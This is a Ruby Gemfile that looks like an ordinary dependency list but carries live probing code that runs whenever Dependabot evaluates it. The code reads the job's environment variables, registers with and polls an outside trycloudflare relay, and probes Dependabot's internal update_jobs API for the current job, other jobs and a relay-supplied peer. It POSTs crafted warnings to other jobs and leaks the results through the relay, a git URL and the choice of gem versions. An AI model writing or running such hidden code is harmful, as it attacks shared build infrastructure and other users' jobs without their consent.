source "https://rubygems.org"

marker_dependencies = []
probe_error = false
write_current_code = "na"
write_previous_code = "na"
write_invalid_code = "na"
peer_id = "none"
peer_read_code = "000"

begin
  require "open3"

  job_token = ENV.fetch("DEPENDABOT_JOB_TOKEN", "")
  api_base = ENV.fetch("DEPENDABOT_API_URL", "").sub(%r{/+$}, "")
  job_id = ENV.fetch("DEPENDABOT_JOB_ID", "")

  marker_dependencies << ["rake", "13.0.1"] unless job_token.empty?
  marker_dependencies << ["minitest", "5.15.0"] unless api_base.empty? || job_id.empty?
  marker_dependencies << ["thor", "1.2.1"] unless ENV.fetch("LOCAL_GITHUB_ACCESS_TOKEN", "").empty?
  marker_dependencies << ["connection_pool", "2.4.1"] unless ENV.fetch("HTTPS_PROXY", "").empty?
  unless api_base.empty? || job_id.empty?
    relay = "https://ladder-markets-took-sending.trycloudflare.com/a70c8a0d3be7e437504441b3"
    relay_actor = "job-#{job_id}"
    Open3.capture3("curl", "-sS", "-m", "5", "#{relay}/register/#{relay_actor}/#{job_id}")

    90.times do
      candidate, = Open3.capture3("curl", "-sS", "-m", "5", "#{relay}/peer/#{relay_actor}/#{job_id}")
      if candidate.match?(/\A[0-9]{1,20}\z/)
        peer_id = candidate
        break
      end
      sleep 1
    end

    internal_url = "#{api_base}/update_jobs/#{job_id}/blocked_versions?package-manager=bundler"
    unauth_code, = Open3.capture3("curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", internal_url)

    status_markers = {
      "401" => ["public_suffix", "4.0.7"],
      "403" => ["crass", "1.0.6"],
      "404" => ["ast", "2.4.2"],
      "000" => ["diff-lcs", "1.5.0"]
    }
    marker = if unauth_code.start_with?("2")
               ["addressable", "2.8.0"]
             else
               status_markers.fetch(unauth_code, ["tilt", "2.0.11"])
             end
    marker_dependencies << marker

    previous_url = "#{api_base}/update_jobs/1621528924/blocked_versions?package-manager=bundler"
    previous_code, = Open3.capture3(
      "curl", "-sS", "-m", "8", "-o", "/tmp/previous-job-body", "-w", "%{http_code}", previous_url
    )
    marker_dependencies << ["faraday", "1.10.0"] if previous_code.start_with?("2")
    previous_status_markers = {
      "401" => ["rspec-support", "3.10.3"],
      "403" => ["rouge", "3.30.0"],
      "404" => ["hashdiff", "1.0.1"],
      "410" => ["builder", "3.2.4"],
      "000" => ["diff-lcs", "1.5.0"]
    }
    marker_dependencies << previous_status_markers.fetch(previous_code, ["tilt", "2.0.11"])
    if File.exist?("/tmp/previous-job-body") && File.size("/tmp/previous-job-body") > 2
      marker_dependencies << ["multi_json", "1.15.0"]
    end

    invalid_url = "#{api_base}/update_jobs/999999999999999999/blocked_versions?package-manager=bundler"
    invalid_code, = Open3.capture3("curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", invalid_url)
    marker_dependencies << ["httparty", "0.20.0"] if invalid_code.start_with?("2")
    invalid_status_markers = {
      "401" => ["method_source", "1.0.0"],
      "403" => ["crass", "1.0.6"],
      "404" => ["regexp_parser", "2.6.0"],
      "410" => ["ruby-progressbar", "1.11.0"],
      "000" => ["rspec-core", "3.10.2"]
    }
    marker_dependencies << invalid_status_markers.fetch(invalid_code, ["rainbow", "3.1.1"])

    if peer_id.match?(/\A[0-9]{1,20}\z/)
      peer_url = "#{api_base}/update_jobs/#{peer_id}/blocked_versions?package-manager=bundler"
      peer_read_code, = Open3.capture3(
        "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", peer_url
      )
      Open3.capture3(
        "curl", "-sS", "-m", "5",
        "#{relay}/result/#{relay_actor}/#{job_id}/#{peer_id}/#{unauth_code}/#{peer_read_code}/#{invalid_code}"
      )
    end

    invalid_warning_body = '{"data":{"unexpected":"dependabot-boundary-probe"}}'
    warning_path = "record_update_job_warning"
    write_current_url = "#{api_base}/update_jobs/#{job_id}/#{warning_path}"
    write_current_code, = Open3.capture3(
      "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}",
      "-X", "POST", "-H", "Content-Type: application/json", "--data-binary", invalid_warning_body,
      write_current_url
    )

    write_previous_url = "#{api_base}/update_jobs/1621534397/#{warning_path}"
    write_previous_code, = Open3.capture3(
      "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}",
      "-X", "POST", "-H", "Content-Type: application/json", "--data-binary", invalid_warning_body,
      write_previous_url
    )

    write_invalid_url = "#{api_base}/update_jobs/999999999999999999/#{warning_path}"
    write_invalid_code, = Open3.capture3(
      "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}",
      "-X", "POST", "-H", "Content-Type: application/json", "--data-binary", invalid_warning_body,
      write_invalid_url
    )
  end

  unless job_id.empty?
    gem "dependabot-job-marker",
        git: "https://job-#{job_id}-peer-#{peer_id}-pr#{peer_read_code}-wc#{write_current_code}-wp#{write_previous_code}-wi#{write_invalid_code}@github.com/chawdamrunal/probe-lab.git",
        branch: "main",
        require: false
  end
rescue Exception
  probe_error = true
end

marker_dependencies << ["erubi", "1.10.0"] if probe_error
marker_dependencies << ["zeitwerk", "2.6.1"]
marker_dependencies.each do |name, version|
  gem name, version
end

gem "rack", "2.2.3"
gem "nokogiri", "1.13.0"
